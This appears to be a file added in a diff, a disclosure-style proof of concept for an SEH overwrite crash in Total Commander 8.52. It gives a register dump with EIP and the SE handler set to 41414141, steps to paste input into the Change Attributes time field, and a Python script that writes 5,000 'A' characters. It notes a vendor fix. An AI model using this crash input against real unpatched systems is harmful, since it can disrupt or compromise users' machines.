@@ -1,0 +1,41 @@
+'''
+********************************************************************************************
+# Exploit Title: Total Commander 32bit SEH Overwrite.
+# Date: 8/27/2015
+# Exploit Author: Un_N0n
+# Software Vendor: http://www.ghisler.com/
+# Software Link: http://www.ghisler.com/download.htm
+# Version: 8.52
+# Tested on: Windows 8 x64(64 BIT)
+********************************************************************************************
+[Info:]
+EAX 00106541 
+ECX FFFFFEFA
+EDX 0031E941
+EBX 04921F64
+ESP 001065FC 
+EBP 41414141
+ESI 04930088
+EDI 0031E9B0
+
+EIP 41414141
+
+SEH chain of main thread, item 0
+	Address=001065FC
+	SE handler=41414141
+'''
+
+[Steps to Produce the Crash]:
+1- Open up 'TOTALCMD.EXE'.
+2- Goto Files -> Change Attributes.
+3- In time field paste in contents of 'Crash.txt'.
+~ Software will crash b/c SEH Overwrite.
+
+[Code for CRASH.txt]
+file = open("crash.txt",'w')
+file.write("A"*5000)
+file.close()
+
+->After Reporting,
+	Vendor has released(bugfix release) a new version(8.52a[9th SEPT 2015]).
+**********************************************************************************************
